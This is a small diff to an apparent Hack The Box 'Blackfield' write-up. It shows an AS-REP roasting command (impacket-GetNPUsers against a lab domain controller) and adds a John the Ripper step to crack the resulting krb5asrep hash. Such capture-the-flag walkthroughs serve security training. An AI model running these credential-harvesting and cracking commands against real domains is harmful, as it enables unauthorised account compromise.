@@ -85,3 +85,10 @@ SMB shares reveal two non-default shares named `forensic` and `profiles$`. The s
 ▶ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/99b7e598-7179-457a-84ab-5ff137a3ed46)
+
+---
+
+## Hash Crack (krb5asrep)
+```CSS
+▶ john krb.hash --format=krb5asrep
+```
